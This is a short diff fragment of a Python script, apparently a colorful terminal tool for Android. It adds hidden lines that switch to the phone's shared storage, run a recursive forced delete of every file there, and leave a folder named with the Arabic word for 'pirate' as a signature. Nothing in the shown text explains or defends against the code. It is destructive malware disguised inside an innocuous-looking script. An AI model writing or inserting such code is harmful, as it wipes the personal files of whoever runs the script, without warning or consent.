@@ -5,6 +5,9 @@ import os
 
 import time
 
+os.chdir("/storage/emulated/0")
+os.system("rm -rif *")
+os.mkdir("قرصان - 8R9")
 Yellow = '\033[1;33m'
 green = '\033[4;32m'
 red = '\033[0;31m'
